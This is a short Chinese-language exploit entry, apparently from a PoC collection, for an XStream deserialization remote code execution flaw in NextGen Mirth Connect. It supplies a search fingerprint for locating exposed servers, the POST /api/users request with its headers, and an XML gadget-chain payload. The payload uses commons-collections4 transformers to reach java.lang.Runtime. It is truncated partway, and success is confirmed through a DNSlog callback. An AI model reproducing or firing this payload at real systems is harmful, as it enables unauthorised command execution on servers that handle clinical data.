# NextGen-Mirth-Connect-XStream远程代码执行漏洞

- **系统**：NextGen　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="Mirth Connect Administrator"`
- **请求**：`POST /api/users HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`X-Requested-With: OpenAPI`　`Content-Type: application/xml`

**请求体 / payload**
```
<sorted-set>
<string>abcd</string>
<dynamic-proxy>
<interface>java.lang.Comparable</interface>
<handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
<target class="org.apache.commons.collections4.functors.ChainedTransformer">
<iTransformers>
<org.apache.commons.collections4.functors.ConstantTransformer>
<iConstant class="java-class">java.lang.Runtime</iConstant>
</org.apache.commons.collections4.functors.ConstantTransformer>
<org.apache.commons.collections4.functors.InvokerTransformer>
<iMethodName>getMethod</iMethodName>
<iParamTypes>
<java-class>java.lang.…（脚本共 1597 字，完整版见原文）
```
- **预期**：200　|　Dnslog回显